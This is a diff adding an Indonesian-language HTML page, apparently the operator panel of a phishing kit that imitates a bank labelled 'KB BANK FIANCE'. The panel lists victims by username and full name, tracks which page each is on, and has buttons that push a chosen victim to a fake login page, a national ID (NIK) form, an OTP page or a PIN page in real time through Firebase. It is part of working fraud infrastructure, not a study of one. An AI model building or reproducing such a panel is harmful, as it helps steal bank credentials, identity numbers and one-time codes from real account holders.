@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Portal Admin KB BANK FIANCE">
+  <title>KB BANK FIANCE — Portal Admin</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .admin-card{margin-top:-40px}
+    .portal-header{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    .portal-header h2{font-size:20px;margin:0}
+    .portal-header p{font-size:12px;color:var(--muted);margin-top:8px;line-height:1.5}
+    .info-list{display:grid;gap:14px;margin-top:18px}
+    .info-box{padding:16px;border-radius:18px;background:#f7f1fd;border:1px solid #e9eafe}
+    .info-box strong{display:block;margin-bottom:6px;font-size:12px;color:#4f2a7a}
+    .info-box span{display:block;color:#1c1d21;font-size:17px;font-weight:700}
+    .portal-row{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-top:20px}
+    .portal-button{border:0;cursor:pointer;border-radius:18px;padding:16px 14px;font-size:13px;font-weight:800;color:var(--purple);background:#fff;box-shadow:var(--shadow);transition:.2s ease}
+    .portal-button.active,.portal-button:hover{background:linear-gradient(135deg,var(--purple-soft),var(--purple));color:#fff;transform:translateY(-1px)}
+    .portal-status{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:20px}
+    .status-pill{display:inline-flex;align-items:center;gap:8px;padding:10px 14px;border-radius:999px;background:#eef3ff;color:#4338ca;font-size:12px;font-weight:700}
+    .status-pill.active{background:#e9f7ef;color:#065f46}
+    .portal-actions{display:flex;gap:12px;flex-wrap:wrap;margin-top:18px}
+    .portal-actions .secondary-btn{flex:1 1 auto;min-width:120px}
+    .user-table-card{margin-top:22px;padding:18px;border-radius:22px;background:#fff;border:1px solid #ececf1;box-shadow:var(--shadow)}
+    .user-table-card h3{margin:0 0 12px;font-size:16px}
+    .table-wrap{overflow-x:auto}
+    .user-table{width:100%;border-collapse:collapse;font-size:12px}
+    .user-table th,.user-table td{padding:12px 10px;text-align:left;border-bottom:1px solid #f0f1f7}
+    .user-table th{color:#6b7280;font-weight:700;font-size:11px;text-transform:uppercase;letter-spacing:.06em}
+    .user-table tbody tr{cursor:pointer;transition:.2s}
+    .user-table tbody tr:hover{background:#f8f7ff}
+    .user-table tbody tr.selected{background:linear-gradient(135deg,#ede9fe,#eef2ff)}
+    .user-table td.status{font-weight:700;color:#4338ca}
+    .portal-footer{margin-top:16px;font-size:11px;color:var(--muted);line-height:1.6}
+    @media(max-width:760px){.portal-row{grid-template-columns:1fr}.portal-actions{flex-direction:column}.info-list{grid-template-columns:1fr}.portal-header{flex-direction:column;align-items:flex-start}}
+  </style>
+</head>
+<body>
+  <main class="app-phone">
+    <section class="mobile-hero">
+      <div class="statusbar">
+        <span>PORTAL ADMIN</span>
+        <div class="status-icons"><span>⌁</span><span>⚡</span><span class="battery">99</span></div>
+      </div>
+      <div class="hero-nav">
+        <button class="back-button" type="button" aria-label="Reload" id="refreshButton">⟳</button>
+        <button class="language-button" type="button"><span>⌄ ID</span><span class="flag"></span></button>
+      </div>
+      <div class="hero-copy">
+        <div class="step"><span class="step-dot"></span>Portal monitoring</div>
+        <h1>Admin Pantau User</h1>
+        <p>Kontrol halaman user secara realtime. Kirim user langsung ke halaman pilihan mereka.</p>
+      </div>
+    </section>
+
+    <section class="mobile-card admin-card">
+      <div class="card-title portal-header">
+        <div>
+          <h2>Portal Realtime</h2>
+          <p>Berikan target halaman untuk user agar saat refresh perangkat mereka akan diarahkan ulang.</p>
+        </div>
+      </div>
+
+      <div class="info-list">
+        <div class="info-box">
+          <strong>Admin</strong>
+          <span id="userName">Admin</span>
+        </div>
+        <div class="info-box">
+          <strong>Peran</strong>
+          <span id="userStatus">Portal Admin</span>
+        </div>
+        <div class="info-box">
+          <strong>User Terpilih</strong>
+          <span id="selectedUserName">Belum ada</span>
+        </div>
+        <div class="info-box">
+          <strong>User Saat Ini</strong>
+          <span id="currentPage">-</span>
+        </div>
+        <div class="info-box">
+          <strong>Target Halaman</strong>
+          <span id="targetPage">-</span>
+        </div>
+        <div class="info-box">
+          <strong>Terakhir Update</strong>
+          <span id="targetUpdated">-</span>
+        </div>
+      </div>
+
+      <div class="portal-row">
+        <button type="button" class="portal-button" data-page="login">Halaman Masuk</button>
+        <button type="button" class="portal-button" data-page="form-nik">Form NIK</button>
+        <button type="button" class="portal-button" data-page="otp">Halaman OTP</button>
+        <button type="button" class="portal-button" data-page="pin">Halaman PIN</button>
+      </div>
+
+      <div class="portal-actions">
+        <button id="clearTarget" class="secondary-btn" type="button">Bersihkan Target</button>
+        <button id="refreshUsers" class="secondary-btn" type="button">Segarkan User</button>
+        <div class="status-pill active" id="portalStatus">Siap mengirim target</div>
+      </div>
+
+      <div class="user-table-card">
+        <h3>Daftar User</h3>
+        <div class="table-wrap">
+          <table class="user-table" aria-label="Daftar user">
+            <thead>
+              <tr>
+                <th>Username</th>
+                <th>Nama Lengkap</th>
+                <th>Status</th>
+                <th>Halaman Sekarang</th>
+                <th>Target Halaman</th>
+                <th>Terakhir Update</th>
+              </tr>
+            </thead>
+            <tbody id="usersTableBody">
+              <tr><td colspan="6">Belum ada user yang terdaftar.</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div id="message" class="message" role="status" aria-live="polite"></div>
+      <div class="portal-footer">Jika target halaman sudah disetel, pengguna akan diarahkan saat mereka memuat ulang atau membuka halaman berikutnya.</div>
+    </section>
+
+    <div class="footer-note">Portal ini menggunakan LocalStorage untuk pengontrolan antar tab/domainsame-origin.</div>
+    <div class="home-indicator"></div>
+  </main>
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<script src="storage.js"></script>
+  <script src="portal.js"></script>
+</body>
+</html>
